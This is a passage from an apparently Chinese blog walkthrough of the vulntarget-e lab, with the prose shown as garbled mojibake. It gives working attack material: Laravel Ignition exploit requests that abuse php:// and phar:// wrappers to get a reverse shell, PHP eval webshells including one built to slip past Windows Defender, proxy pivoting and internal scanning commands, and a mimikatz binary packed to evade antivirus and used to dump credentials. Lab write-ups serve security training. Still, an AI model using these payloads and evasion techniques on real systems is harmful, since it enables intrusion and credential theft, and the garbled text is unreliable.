class="number">6</span>E=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=30=00=67</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=33=00=52</span>=<span class="number">00=74=00=63</span>=<span class="number">00=43=00=39</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=31</span>=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=62=00=79</span>=<span class="number">00=41=00=76</span>=<span class="number">00=64=00=47</span>=<span class="number">00=31=00=77</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=32=00=59</span>=<span class="number">00=37=00=59</span>=<span class="number">00=32=00=46</span>=<span class="number">00=30=00=49</span>=<span class="number">00=43=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=77=00=76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=49=00=43</span>=<span class="number">00=31=00=70</span>=<span class="number">00=49=00=44</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=46=00=38</span>=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=32</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=43=00=34</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=44=00=51</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=49</span>=<span class="number">00=34=00=49</span>=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=67=00=50</span>=<span class="number">00=69=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=69=00=63</span>=<span class="number">00</span>=<span class="number">70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=42</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=63=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">38</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=54=00=73</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=68</span>=<span class="number">00=70=00=64</span>=<span class="number">00=44=00=73</span>=<span class="number">00=67=00=50</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=34=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=33=00=31</span>=<span class="number">00=39=00=66</span>=<span class="number">00=51=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=52=00=34</span>=<span class="number">00=64=00=41</span>=<span class="number">00=51=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=55</span>=<span class="number">00=33=00=59</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=42=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=66=00=39</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=48</span>=<span class="number">00</span>=<span class="number">52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=33</span>=<span class="number">00=51=00=58</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=69=00=57</span>=<span class="number">00</span>=<span class="number">53</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=76</span>=<span class="number">00=55=00=64</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=41=00=44</span>=<span class="number">00=44=00=62</span>=<span class="number">00</span>=<span class="number">34</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=69=00=43</span>=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00</span>=<span class="number">66</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=74=00=77</span>=<span class="number">00=49=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=42=00=48</span>=<span class="number">00</span>=<span class="number">51</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=43</span>=<span class="number">00</span>a&quot;</span></span><br><span class="line"><span class="dns">  &#125;</span></span><br><span class="line"><span class="dns">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201330580.png" alt="image-20221129201330580"></p><p>å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œæ¸…ç©ºå¯¹logæ–‡ä»¶ä¸­çš„å¹²æ‰°å­—ç¬¦ï¼Œåªç•™ä¸‹POCï¼šè¿”å›200</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>299</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201505852.png" alt="image-20221129201505852"></p><p>ä½¿ç”¨phar://è¿›è¡Œååºåˆ—åŒ–ï¼Œæ‰§è¡Œä»»æ„ä»£ç ï¼ˆæœ‰çš„æ–‡ç« è¯´ç›¸å¯¹è·¯å¾„ï¼Œæœ‰çš„ç»å¯¹è·¯å¾„ï¼Œè¿™é‡Œç¬”è€…è§‰å¾—è¿˜æ˜¯ç›¸å¯¹è·¯å¾„å¥½ç”¨ï¼Œç»å¯¹è·¯å¾„æ²¡å‡ºï¼Œå¦‚æœæƒ³ç”¨ç»å¯¹è·¯å¾„ï¼Œä¸Šé¢500æŠ¥é”™å“ªé‡Œæœ‰è·¯å¾„ï¼Œæˆ‘ä»¬è¿™é‡Œä½¿ç”¨ç›¸å¯¹å§ï¼‰ï¼šè¿™é‡Œè¦å…ˆncç›‘å¬ä¸€ä¸‹<br><code>nc -lvnp 9999</code>shellå°±è¿‡æ¥äº†ï¼Œ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>204</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;phar://../storage/logs/laravel.log/test.txt&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201932533.png" alt="image-20221129201932533"></p><p>è¿™é‡Œæˆ‘ä»¬å°±æ‹¿åˆ°shelläº†ï¼Œä½†æ˜¯ä¼ æ–‡ä»¶å¯èƒ½ä¸å¤ªå¥½ç”¨ï¼Œè¦åå‘ä¸‹è½½ï¼Œæˆ‘ä»¬è¿™é‡Œåˆ°webè·Ÿè·¯å¾„å†™ä¸ªğŸåé¢æ–¹ä¾¿ä¼ æ–‡ä»¶ä¸‹è½½å•¥çš„ã€‚éœ€è¦æ³¨æ„ï¼Œè¿™ä¸ªæ‰§è¡Œå°±åªèƒ½æ‰§è¡Œä¸€æ¬¡ï¼Œä¸Šé¢å·²ç»è¯´è¿‡äº†ï¼Œæ—¥å¿—æ–‡ä»¶ä¼šè¢«è¦†ç›–ï¼Œæ‰€ä»¥å¦‚æœæ²¡æ‰“æˆåŠŸå°±è¦é‡æ–°æ¥ä¸€éï¼Œè€Œä¸”ç¬¬ä¸€æ¬¡æ¸…ç©ºæ—¥å¿—çš„æ—¶å€™ä¸€å®šè¦è¿”å›200æ‰ç®—æ¸…ç©ºæˆåŠŸã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html/public</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php eval($_POST[g]);?&gt;&#x27;</span> &gt; a.php</span><br><span class="line">cat a.php</span><br><span class="line">http://192.168.144.55/a.php</span><br><span class="line">g</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129203359747.png" alt="image-20221129203359747"></p><p>ä¿¡æ¯æ”¶é›†ä¸€æ³¢ï¼Œç¯å¢ƒå¹¶æ²¡æœ‰è£…net-toolsï¼Œæ²¡æœ‰ifconfig ï¼Œæ‰€ä»¥æˆ‘ä»¬<code>ip a</code> ä¹Ÿå¯ä»¥æŸ¥çœ‹ipï¼Œä¸¤å—ç½‘å¡ï¼Œå†…ç½‘è¿˜æœ‰ä¸€ä¸ª20çš„æ®µ</p><p><img src="/images/vulntarget-e/image-20221129203818846.png" alt="image-20221129203818846"></p><p>ç„¶åä¸Šä¸ªlse æˆ–è€…linux-exploit-suggester-master è¿›è¡Œææƒä¸€ä¸‹ï¼Œå½“ç„¶ä¸æä¹Ÿæ²¡å…³ç³»ï¼Œä¸å½±å“åé¢ã€‚è¿™é‡Œç¬”è€…æŠŠä¸Šé¢ä¸¤ä¸ªææƒè¾…åŠ©å·¥å…·éƒ½è·‘äº†ä¸€ä¸‹ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆå¥½çš„ææƒæ–¹æ³•ï¼Œçœ‹äº†çœ¼wpï¼Œè¯´æœ‰å¼±å£ä»¤ã€‚é‚£è‚¯å®šæ˜¯çœ‹passwdæ–‡ä»¶ï¼ŒçŸ¥é“ç”¨æˆ·å<code>vulntarget</code>ï¼Œç„¶åçˆ†ç ´ä¸€ä¸‹ã€‚</p><p><img src="/images/vulntarget-e/image-20221129211426271.png" alt="image-20221129211426271"></p><p>é‚£è¿™æ ·çš„è¯ï¼Œè¿ä¸Šå»å°±å¯ä»¥äº†ã€‚æˆ‘ä»¬è¿™é‡Œè¿˜æ˜¯ç”¨èšå‰‘å§</p><p><img src="/images/vulntarget-e/image-20221129213522722.png" alt="image-20221129213522722"></p><p>./fscan_amd64 -h 10.0.20.141/24 -o a.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">./fscan_amd64 -h 10.0.20.141/24 -o a.txt</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ä¼¼ä¹å¹¶æ²¡æœ‰æ‰«åˆ°å†…ç½‘ï¼Œå› ä¸ºè¿™å°æ˜¯winçš„æœºå™¨ï¼Œå¯èƒ½æ˜¯é˜²ç«å¢™çš„ä½œç”¨ã€‚æˆ‘ä»¬åŠ ä¸ªnp ç¦pingæ‰«</span><br><span class="line"></span><br><span class="line">./fscan_amd64 -h 10.0.20.141/24 -pn -o s.txt</span><br><span class="line">10.0.20.141:22 open</span><br><span class="line">10.0.20.100:80 open</span><br><span class="line">10.0.20.141:80 open</span><br><span class="line">10.0.20.100:443 open</span><br><span class="line">[*] WebTitle:https://10.0.20.100       code:403 len:301    title:403 Forbidden</span><br><span class="line">[*] WebTitle:http://10.0.20.141        code:200 len:7      title:Laravel</span><br><span class="line">[+] InfoScan:http://10.0.20.141        [Laravel] </span><br><span class="line">[*] WebTitle:http://10.0.20.100        code:200 len:42     title:Online Veterinary Appointment System - PHP</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ª100çš„æœºå™¨ï¼Œä¸”å¼€äº†80å¹¶ä¸”æ˜¯ä¸€ä¸ªwinserver,æŒ‚ä»£ç†è®¿é—®</p><p>é‚£ä¹ˆç›´æ¥ä¸Šä»£ç†ï¼Œè¿™é‡Œç¬”è€…ä¸Šewï¼ŒæŠŠå†…ç½‘å¸¦å‡ºæ¥ã€‚æ‹–ä¸ªewä¸Šå»ï¼Œæ”¹ä¸€ä¸‹777æƒé™.å½“ç„¶å…¶ä»–ä»£ç†è½¯ä»¶ä¹Ÿè¡Œï¼Œä¸å”¯ä¸€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s ssocksd -l 8887</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129215012297.png" alt="image-20221129215012297"></p><p><img src="/images/vulntarget-e/image-20221129215310468.png" alt="image-20221129215310468"></p><p>ç”¨proxifieråŠ ä¸ªserversåœ°å€å†™å¤–ç½‘åœ°å€ï¼Œç«¯å£å†™ä»£ç†ç«¯å£</p><p>æ–°åŠ ä¸€ä¸ªè§„åˆ™ï¼Œæˆ‘ä»¬å†™é€šå¾€20çš„æ®µï¼Œèµ°ä»£ç†</p><p><img src="/images/vulntarget-e/image-20221129215644648.png" alt="image-20221129215644648"></p><p><img src="/images/vulntarget-e/image-20221129215733868.png" alt="image-20221129215733868"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°èƒ½æˆåŠŸè®¿é—®20æ®µipäº†ã€‚</p><p>è®°ä¸€ä¸ªå‘ï¼šæˆ‘åœ¨ä¸Šå®Œewåå¯åŠ¨äº†ä¹‹åä½¿ç”¨è°·æ­Œå¸¦çš„é‚£ä¸ªæ’ä»¶[SwitchyOmega] ä¹ŸåŠ äº†ä¸€ä¸ªä»£ç†ï¼Œç„¶åå»è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œå‰å‡ æ¬¡è¿˜è¡Œï¼Œä¸‰äº”æ¡è®¿é—®ä¹‹åè¿™ä¸ªé“¾è·¯å°±æŒ‚äº†ï¼Œ</p><p>linuxä¸­ewæŠ¥<code>Segmentation fault (core dumped)</code> å…ˆå¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯ewç‰ˆæœ¬ä¸å¯¹æˆ–è€…èšå‰‘æ‰§è¡Œå‘½ä»¤çš„é—®é¢˜ï¼Œå› ä¸ºä»¥å‰æ²¡æœ‰å‡ºç°è¿‡è¿™ä¸ªæƒ…å†µï¼Œæˆ‘åˆå»shellé‡Œæµ‹äº†ä¸€ä¸‹ï¼Œå‘ç°ï¼Œæµè§ˆå™¨å¯èƒ½æœ‰æ’ä»¶å¯èƒ½ä¼šè®¿é—®è°·æ­Œæˆ–è€…å…¶ä»–å¤–ç½‘ï¼Œç„¶åå°±åœæ‰äº†ã€‚æˆ‘ç”¨äº†proxifieråªåŠ ç›®æ ‡åœ°å€æ®µæ²¡æœ‰å‡ºç°ä»»ä½•é—®é¢˜ã€‚å¯èƒ½æ˜¯è®¿é—®å¤–ç½‘çš„åŸå› ã€‚æ²¡å…³ç³»ï¼Œè§£å†³äº†å°±å¥½äº†</p><p><img src="/images/vulntarget-e/image-20221129221150992.png" alt="image-20221129221150992"></p><h3 id="OVAS-PHP-æ¼æ´æ‹¿shellï¼Œå…æ€df"><a href="#OVAS-PHP-æ¼æ´æ‹¿shellï¼Œå…æ€df" class="headerlink" title="OVAS - PHP æ¼æ´æ‹¿shellï¼Œå…æ€df"></a>OVAS - PHP æ¼æ´æ‹¿shellï¼Œå…æ€df</h3><p>å¼€å±€ç»™åˆ°ä¸€ä¸ªcmsï¼Œåˆšå¼€å§‹æ‰“çš„æ—¶å€™ï¼Œæˆ‘å»googleäº†ä¸€åœˆä¹Ÿæ‰¾åˆ°åˆ©ç”¨çš„æ–¹æ³•ï¼Œç”šè‡³è¿æåˆ°è¿™ä¸ªcmsçš„æ–‡ç« éƒ½å¾ˆå°‘ï¼Œï¼ˆé™¤äº†å…¶ä»–ä½¬å†™çš„wpï¼‰ï¼Œå°±å»æ‰«äº†ç›®å½•çœ‹çœ‹æœ‰å•¥æç¤ºã€‚ç„¶åå›æ¥å†çœ‹çœ‹å‘ç°å³ä¸Šè§’æœ‰ä¸ªadminlogin ï¼Œè¯•ç€æŠ“åŒ…çœ‹ä¸€ä¸‹ï¼Œæˆ‘ä»¬çœ‹åˆ°usernameï¼Œpasswordéƒ½æ˜¯æ˜æ–‡ä¸”æ²¡æœ‰éªŒè¯ç ï¼Œå­˜åœ¨çˆ†ç ´çš„æ¡ä»¶ï¼Œæˆ‘ä»¬åŠ è½½å­—å…¸çˆ†ç ´ä¸€ä¸‹ã€‚çˆ†ç ´æˆåŠŸadminï¼Œadmin123</p><p><img src="/images/vulntarget-e/image-20221129221707205.png" alt="image-20221129221707205"></p><p><img src="/images/vulntarget-e/image-20221129221813516.png" alt="image-20221129221813516"></p><p>æˆ‘ä»¬ç™»å½•åå°ï¼Œé‚£è‚¯å®šæ˜¯æƒ³åŠæ³•æ‹¿shelläº†ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å•¥ä¸Šä¼ ç‚¹ï¼Œç»è¿‡æµ‹è¯•åœ¨settingsä¸­æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ï¼Œsettingsä¸­åœ¨welcomeä¸­æ·»åŠ ä¸€ä¸ªå›¾ç‰‡ï¼Œç„¶ååœ¨éšä¾¿é€‰ä¸€ä¸ªå›¾ç‰‡ï¼Œç‚¹æœ€ä¸‹é¢updateæäº¤</p><p><img src="/images/vulntarget-e/image-20221130103146247.png" alt="image-20221130103146247"></p><p>ç„¶ååœ¨ä½ æ’çš„é‚£å¼ å›¾ç‰‡ä¸­çš„base64ç¼–ç ä¸­æ’å…¥ä¸€å¥è¯ï¼Œåœ¨æœ€å¼€å§‹æ²¡çœ‹wpçš„æ—¶å€™ï¼Œæˆ‘å°±å†™äº†ç®€å•çš„phpinfoæ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œæˆ‘ä¸Šä¼ æ™®é€šä¸€å¥è¯æœ¨é©¬ï¼Œæ–‡ä»¶å°±æŠ¥é”™ï¼Œä¸»é¡µé¢æ˜¾ç¤ºincludeé”™è¯¯ï¼Œä»¥ä¸ºæ˜¯å“ªé‡Œæ‰“é”™äº†ï¼Œç½‘ç«™å´©äº†ï¼Œåæ¥å‘ç°å¹¶ä¸æ˜¯ï¼Œæˆ‘ç™»ä¸Šå»winå‘ç°ï¼Œwinä¸Šå¼€çš„æœ‰dfï¼Œç›´æ¥æŠŠæˆ‘çš„ğŸå„¿æ€äº†ï¼Œphpinfoä¸æ€ï¼Œä¸è¿‡ä¹Ÿæ²¡å…³ç³»ï¼Œdfå¯¹webshellæŸ¥æ€çš„èƒ½åŠ›æ¯”è¾ƒå·®ï¼Œç½‘ä¸Šéšä¾¿æ‰¾ä¸ªç®€å•å…æ€å°±èƒ½è¿‡ã€‚è¿™é‡Œç¬”è€…æä¾›ä¸€ä¸ªã€‚æ—¢ç„¶ç™»ä¸Šå»äº†ï¼Œç¬”è€…å°±æŠŠdfæ›´æ–°åˆ°æœ€æ–°ç‰ˆäº†ï¼Œè¿™ä¸ªğŸå„¿ä¾ç„¶èƒ½ç”¨ã€‚ä¸‹é¢éƒ½æ˜¯åŸºäºåšæ–°ç‰ˆçš„dfï¼Œtime-22.11.28</p><p><img src="/images/vulntarget-e/image-20221130200829649.png" alt="image-20221130200829649"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bohemian</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;/*bohemian*/&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;g&#x27;</span>].<span class="string">&quot;/*bohemian**/&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line">@<span class="keyword">eval</span>(bohemian());phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221130104355866.png" alt="image-20221130104355866"></p><p>è¿™é‡ŒæŠŠåŒ…å‘è¿‡å»å°±å¯ä»¥äº†ï¼Œé‡Œé¢æœ‰ä¸ªphpinfo æˆ‘ä»¬æ–¹ä¾¿æŸ¥çœ‹ï¼Œå»åˆ°ä¸»é¡µçœ‹çœ‹</p><p><img src="/images/vulntarget-e/image-20221130103829535.png" alt="image-20221130103829535"></p><p><img src="/images/vulntarget-e/image-20221130110109643.png" alt="image-20221130110109643"></p><p>æ²¡æœ‰é—®é¢˜ï¼Œèšå‰‘è¿ä¸€ä¸‹ã€‚æˆåŠŸæ‹¿åˆ°shell</p><p><img src="/images/vulntarget-e/image-20221130110051787.png" alt="image-20221130110051787"></p><p>ä¸Šæ¥å°±èƒ½çœ‹åˆ°systemæƒé™ï¼Œä¸”æœ‰ä¸¤å—ç½‘å¡ï¼Œå†…éƒ¨è¿˜æœ‰ä¸€ä¸ª10çš„æ®µ</p><p><img src="/images/vulntarget-e/image-20221130110251974.png" alt="image-20221130110251974"></p><p>ä¿¡æ¯æ”¶é›†ä¸€æ³¢æˆ‘ä»¬çŸ¥é“æ˜¯å¼€ç€dfçš„å…ˆå»æ¡Œé¢ç¿»ç¿»çœ‹ï¼Œæ¡Œé¢ä¸Šæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯è¿™ä¸ªç›®å½•C:/Users/Administrator/æœ‰ä¸ªflagæ–‡ä»¶ï¼Œå†…å®¹<code>vulntarget&#123;VGhlIGhvc3QgcGFzc3dvcmQgbWF5IGJlIHVzZWQgZm9yIG90aGVyIHB1cnBvc2Vz&#125;  +_+</code>å…¸å‹çš„base64  è§£ä¸€ä¸‹ï¼Œ<code>The host password may be used for other purposes</code>ç¬”è€…å·¥åœ°è‹±è¯­ç¿»ä¸€ä¸‹ï¼Œå¤§è‡´çš„æ„æ€æ˜¯è¿™ä¸ªç”µè„‘çš„å¯†ç ä¼šè¢«ç”¨åˆ°å…¶ä»–åœ°æ–¹ã€‚é‚£ä¹ˆæˆ‘ä»¬è‚¯å®šå»æŠ“å¯†ç äº†ã€‚é‚£å°±åœ¨è¿™ç½‘ç«™è·¯å¾„ä¸‹ç©¿ä¸ªmimikatzï¼Œå½“ç„¶æˆ‘ä»¬ä¼ ä¸Šå»è‚¯å®šç§’æ€ï¼Œdfå¯¹mimikatzéå¸¸æ•æ„Ÿçš„ï¼Œè¿™é‡Œæˆ‘ä»¬å‘¢å»åšä¸€ä¸ªç®€å•å…æ€ã€‚</p><p>å¦‚æœæƒ³æ·±å…¥ç ”ç©¶mimikatzçš„å…æ€ï¼Œå‚è€ƒè¿™ä½ä½¬çš„æ–‡ç« ï¼ŒMimikatzçš„18ç§å…æ€å§¿åŠ¿åŠé˜²å¾¡ç­–ç•¥<code>https://www.freebuf.com/news/234365.html</code></p><p>è¿™é‡Œç¬”è€…æä¾›ä¸€ç§éå¸¸ç®€å•çš„å…æ€æ“ä½œï¼Œå°±æ˜¯åŠ å£³ï¼Œéå¸¸ç®€å•æ‹¿å·¥å…·å»ç”Ÿæˆä¸€ä¸ªå°±è¡Œã€‚</p><p><code>å½“ç„¶è¿™é‡Œå…æ€çš„æ“ä½œå…¶å®éƒ½å¯ä»¥ä¸åšï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Œå› ä¸ºä¸Šé¢å…¶å®æˆ‘ä»¬å·²ç»æ˜¯systemæƒé™äº†ï¼Œæˆ‘ä»¬å…¶å®æŠŠdfå…³æ‰å°±è¡Œï¼Œä½†æ˜¯è¿™é‡Œæ˜¯é¶åœºï¼Œè”ç³»ä¸€ä¸‹æ²¡æœ‰åå¤„</code></p><p>ä¸‹é¢æˆ‘ä»¬å…ˆå¯¹mimikatzå…æ€ï¼Œæ‰“å¼€VMProtect,é€‰æ‹©mimikatzå°±è¡Œäº†ï¼Œä»–å°±ä¼šç¼–è¯‘äº†ï¼Œç„¶åä¼šç”Ÿæˆmimikatzvm.vmp.exeï¼ŒæŠŠè¿™ä¸ªä¼ ä¸Šå»å°±è¡Œäº†</p><p><img src="/images/vulntarget-e/image-20221130112521657.png" alt="image-20221130112521657"></p><p><img src="/images/vulntarget-e/image-20221130112528427.png" alt="image-20221130112528427"></p><p>è¿™é‡Œæ²¡æœ‰äº¤äº’å¼shellæˆ‘ä»¬ç”¨mimikatzæŠ“çš„è¯ï¼Œç›´æ¥å¯¼å‡ºç»“æœå°±è¡Œ</p><p><code>mimikatzvm.vmp.exe &quot;sekurlsa::logonpasswords&quot; exit &gt; s.txt</code></p><figure class="highlight 